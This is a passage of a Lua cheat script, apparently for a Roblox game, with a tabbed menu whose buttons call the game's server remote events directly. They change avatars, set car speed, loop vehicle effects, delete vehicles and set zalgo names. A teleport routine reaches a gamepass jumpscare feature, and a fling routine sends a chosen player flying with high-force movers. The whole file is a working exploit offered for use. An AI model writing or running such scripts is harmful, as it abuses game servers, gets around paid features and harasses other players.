    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Adidas Sport animation"
})
Tab:AddButton({
	Name = "Idle",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538150608
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Run",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538133604
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Walk",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538146480
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "jump",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538153691
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Fall",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538153691
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Climb",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538170170
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Zombie "
})
Tab:AddButton({
	Name = "zombie leg",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 37754710,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})

local Tab = Window:MakeTab({
Name = "CARROS🏎️",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})
local Section = Tab:AddSection({
    Name = "Velocity"
})

-- Variables
local CarSpeed = 200

-- Textbox for Car Speed
Tab:AddTextbox({
Name = "Car Speed",
Default = "",
TextDisappear = true,
Callback = function(value)
CarSpeed = tonumber(value)
end
})

-- Button to Update Car Speed
Tab:AddButton({
Name = "Update Speed",
Callback = function()
local args = {
[1] = "PlayerGiveSpeedLower",
[2] = CarSpeed
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Loop"
})

local toggleActive = false
local function loopDuke()
while toggleActive do
local args = {
    [1] = "Duke"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Duke",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopDuke()
end
end
})

local toggleActive = false
local function loopFlip()
while toggleActive do
local args = {
    [1] = "Flip"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Flip",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFlip()
end
end
})

local toggleActive = false
local function loopSmoke()
while toggleActive do
local args = {
    [1] = "Smoke"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Smoke",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopSmoke()
end
end
})

local toggleActive = false
local function loopFire()
while toggleActive do
local args = {
    [1] = "Fire"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Fire",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFire()
end
end
})
local Section = Tab:AddSection({
    Name = "Delete Vehicle"
})
Tab:AddButton({
	Name = "Delete Vehicle",
	Callback = function()
      	local args = {
    [1] = "DeleteAllVehicles"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))	
  	end    
})
local Section = Tab:AddSection({
    Name = "Horse"
})
Tab:AddButton({
	Name = "Spawn Horse",
	Callback = function()
      	local args = {
    [1] = "PickingCar",
    [2] = "Horse"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  	end    
})

local toggleActive = false
local function loopFire()
while toggleActive do
local args = {
    [1] = "BrownHorseFree"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
wait(1.0)
local args = {
    [1] = "BlackHorseFree"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop color horse",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFire()
end
end
})
local Section = Tab:AddSection({
    Name = "Jumpscare Car - GamePass"
})
Tab:AddButton({
	Name = "Screaming Woman",
	Callback = function()
      	 local plr = game.Players.LocalPlayer
local char = plr.Character
local hrp = char.HumanoidRootPart

hrp.CFrame = CFrame.new(-24.741954803466797, 3.0249993801116943, -66.39078521728516)
wait(0.1)
local args = {
    [1] = "PickingCar",
    [2] = "SchoolBus"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
wait(1)
 local plr = game.Players.LocalPlayer
local char = plr.Character
local hrp = char.HumanoidRootPart

hrp.CFrame = CFrame.new(-35.15000534057617, 5.7094035148620605, -74.16535949707031)
wait(0.1)
local args = {
    [1] = "PickingCarMusicText",
    [2] = "892233254"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Truck"
})
Tab:AddButton({
	Name = "Spawn Truck",
	Callback = function()
      	local args = {
    [1] = "PickingCar",
    [2] = "Semi"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Name Scripter - zalgo",
	Callback = function()
      	local args = {
    [1] = "ReturningSemiName",
    [2] = "S\205\138\204\144\205\129c\205\155\205\155\204\190r\205\139\205\132\204\191i\205\128\205\144\205\145p\205\138\204\144\205\152t\205\140\204\154\205\145e\205\140\204\149r\204\148\204\148\205\145"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Name Alatorisosksksisisksksj- zalgo",
	Callback = function()
      	local args = {
    [1] = "ReturningSemiName",
    [2] = "A\205\139\204\189\205\131\204\183d\205\129\205\139\204\189\204\183m\204\191\204\147\205\132\204\183i\204\190\205\131\204\189\204\183n\204\189\204\144\204\154\204\183"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Name Troll - zalgo",
	Callback = function()
      	local args = {
    [1] = "ReturningSemiName",
    [2] = "T\205\134\204\144\205\132 R\205\157\205\132\204\154 O\204\149\205\160 L\205\145\205\140\205\132 L\204\190\205\132\204\190"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
  	end    
})

local Tab = Window:MakeTab({
	Name = "SOUND GUN",
	Icon = "rbxassetid://12243672214",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Sniper"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "PEGAR SNIPEE",
	Callback = function()
	local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(args))

  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]] 

Tab:AddButton({
	Name = "Som fe (tu não ouve🚨)",
	Callback = function()
      		local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Sniper.Handle,
    [2] = 7991195102,
    [3] = 1
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Gu1nSound1s"):FireServer(unpack(args))

  	end    
})


local Tab = Window:MakeTab({
	Name = "Versões do script/flings",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local flingActive = false
local loopFlingActive = false
local selectedPlayer = nil
local bodyVelocity, bodyAngularVelocity

local function startFling()
    if flingActive or not selectedPlayer then return end
    flingActive = true

    local character = game.Players.LocalPlayer.Character
    local targetCharacter = selectedPlayer.Character
    if not character or not targetCharacter then return end
    local hrp = character:WaitForChild("HumanoidRootPart")
    local targetHrp = targetCharacter:WaitForChild("HumanoidRootPart")

    -- Change character size down
    local args = {
        [1] = "CharacterSizeDown",
        [2] = 5
    }
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  
  -- Equipa o item 'Couch'
  local args = {
[1] = "PickingTools",
[2] = "Couch"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  
  -- Equipa o item 'Couch' no inventário se ainda não estiver equipado
local backpack = game.Players.LocalPlayer.Backpack
if backpack and not couchEquipped then
local couch = backpack:FindFirstChild("Couch")
if couch then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
couchEquipped = true
else
print("O item 'Couch' não foi encontrado no seu inventário.")
end
end
  
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(10, 99, 10)
    bodyVelocity.MaxForce = Vector3.new(9999, 9999, 9999)
    bodyVelocity.Parent = hrp

    bodyAngularVelocity = Instance.new("BodyAngularVelocity")
    bodyAngularVelocity.AngularVelocity = Vector3.new(999, 999, 999)
    bodyAngularVelocity.MaxTorque = Vector3.new(999, 999, 999)
    bodyAngularVelocity.Parent = hrp

    game:GetService("RunService").Stepped:Connect(function()
        if flingActive then
            hrp.CFrame = targetHrp.CFrame
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(0), 0)
        end
    end)
end

local function stopFling()
    if not flingActive then return end
    flingActive = false

    -- Change character size up
    local args = {
        [1] = "CharacterSizeUp",
        [2] = 1
    }
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))

    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyAngularVelocity then bodyAngularVelocity:Destroy() end
end

local function loopFling()
    while loopFlingActive do
        if selectedPlayer and selectedPlayer.Character then
            startFling()
            wait(0.1)
            stopFling()
        end
        wait(0.1)
    end
end

local function updatePlayerList()
local players = game.Players:GetPlayers()
local playerNames = {}
for _, player in ipairs(players) do
table.insert(playerNames, player.Name)
end
return playerNames
end



local playerDropdown = Tab:AddDropdown({
Name = "Select Player",
Default = "",
Options = updatePlayerList(),
Callback = function(value)
selectedPlayer = game.Players:FindFirstChild(value)
end
})

Tab:AddButton({
Name = "Update Player List",
Callback = function()
playerDropdown:Refresh(updatePlayerList(), true)
end
})

Tab:AddButton({
Name = "Start Fling",
Callback = function()
startFling()
end
})

Tab:AddButton({
Name = "Stop Fling",
Callback = function()
stopFling()
end
})
